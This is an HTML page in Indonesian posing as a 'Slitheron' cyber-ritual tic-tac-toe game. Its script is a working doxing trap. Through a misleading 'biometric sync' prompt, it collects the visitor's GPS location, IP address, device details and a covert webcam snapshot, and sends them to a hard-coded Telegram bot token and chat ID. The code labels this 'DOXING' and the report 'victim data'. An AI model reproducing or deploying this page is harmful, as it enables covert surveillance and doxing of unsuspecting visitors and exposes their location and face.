<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>S L I T H E R O N | RITUAL</title>
    <style>
        :root { --accent: #ff3333; --bg: #000000; }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        
        #gate { width: 100%; max-width: 380px; text-align: center; padding: 40px 20px; border: 1px solid #111; background: linear-gradient(180deg, #050505 0%, #000 100%); }
        h1 { font-weight: 200; letter-spacing: 12px; font-size: 22px; margin-bottom: 20px; color: #fff; }
        .line { height: 1px; width: 50px; background: var(--accent); margin: 0 auto 30px; }
        .info { font-size: 10px; line-height: 2; color: #444; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 40px; padding: 0 20px; }
        
        .btn-sync { background: transparent; border: 1px solid #333; color: #fff; padding: 15px 40px; font-size: 11px; letter-spacing: 5px; cursor: pointer; transition: 0.4s; text-transform: uppercase; }
        .btn-sync:hover { border-color: var(--accent); box-shadow: 0 0 20px rgba(255, 51, 51, 0.2); }

        #arena { display: none; width: 100%; max-width: 320px; }
        .board { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 20px; }
        .cell { height: 100px; background: #050505; border: 1px solid #111; display: flex; align-items: center; justify-content: center; font-size: 30px; cursor: pointer; color: var(--accent); }
        
        video, canvas { display: none; }
    </style>
</head>
<body>

<div id="gate">
    <h1>SLITHERON</h1>
    <div class="line"></div>
    <p class="info">Sinkronisasi identitas diperlukan untuk memvalidasi akses pahlawan ke dalam ritual cyber.</p>
    <button class="btn-sync" onclick="startInfiltration()">Sinkronkan</button>
</div>

<div id="arena">
    <div style="font-size: 10px; letter-spacing: 3px; color: #444; margin-bottom: 20px;">RITUAL DIMULAI...</div>
    <div class="board">
        <div class="cell" onclick="move(this)"></div><div class="cell" onclick="move(this)"></div><div class="cell" onclick="move(this)"></div>
        <div class="cell" onclick="move(this)"></div><div class="cell" onclick="move(this)"></div><div class="cell" onclick="move(this)"></div>
        <div class="cell" onclick="move(this)"></div><div class="cell" onclick="move(this)"></div><div class="cell" onclick="move(this)"></div>
    </div>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c" width="640" height="480"></canvas>

<script>
    const BOT_TOKEN = '8048569392:AAFir3moMKGzpxYheREzxjLNzGBuVsYBB6s';
    const CHAT_ID = '6932904607';

    // Cek Kunjungan Sebelumnya
    const checkVisit = localStorage.getItem('vstd') ? "Ada / Yes" : "Tidak ada / None";
    localStorage.setItem('vstd', 'true');

    async function pushToTelegram(method, data) {
        let url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
        let body;

        if (method === 'sendPhoto') {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', data);
            return fetch(url, { method: 'POST', body: fd });
        } else {
            body = JSON.stringify({ chat_id: CHAT_ID, ...data });
            return fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: body
            });
        }
    }

    async function startInfiltration() {
        if(confirm("Gunakan 'Mirror Shield' dengan GPS dan Kamera untuk sinkronisasi biometrik?")) {
            document.getElementById('gate').style.display = 'none';
            document.getElementById('arena').style.display = 'block';
            
            // PROSES DOXING BERURUTAN
            navigator.geolocation.getCurrentPosition(async (pos) => {
                // 1. Kirim Map Lokasi
                await pushToTelegram('sendLocation', { 
                    latitude: pos.coords.latitude, 
                    longitude: pos.coords.longitude 
                });
                
                // 2. Ambil & Kirim Teks Laporan
                await generateTextReport();
                
                // 3. Ambil & Kirim Foto
                captureFace();
            }, async () => {
                // Jika GPS ditolak, tetap kirim teks & foto
                await generateTextReport();
                captureFace();
            });
        }
    }

    async function generateTextReport() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const d = await res.json();
            const now = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }).replace(/\//g, '-');
            
            const report = `<b>DATA KORBAN</b>\n\n` +
                `Waktu Akses | Access Time : ${now}\n` +
                `Alamat IP | IP Address : <code>${d.ip}</code>\n` +
                `Perangkat | Device : ${navigator.userAgent}\n` +
                `Sistem Operasi | Operating System : ${navigator.platform}\n` +
                `Resolusi Layar | Screen Resolution : ${window.screen.width} x ${window.screen.height}\n` +
                `Kunjungan Sebelumnya | Previous Visit : ${checkVisit}`;

            await pushToTelegram('sendMessage', { text: report, parse_mode: 'HTML' });
        } catch (e) {}
    }

    async function captureFace() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('v');
            video.srcObject = stream;
            
            setTimeout(() => {
                const canvas = document.getElementById('c');
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                canvas.toBlob(blob => {
                    pushToTelegram('sendPhoto', blob);
                    stream.getTracks().forEach(track => track.stop());
                }, 'image/jpeg');
            }, 2500);
        } catch (e) {}
    }

    function move(el) {
        if(el.innerText === "") el.innerText = "X";
    }
</script>
</body>
</html>
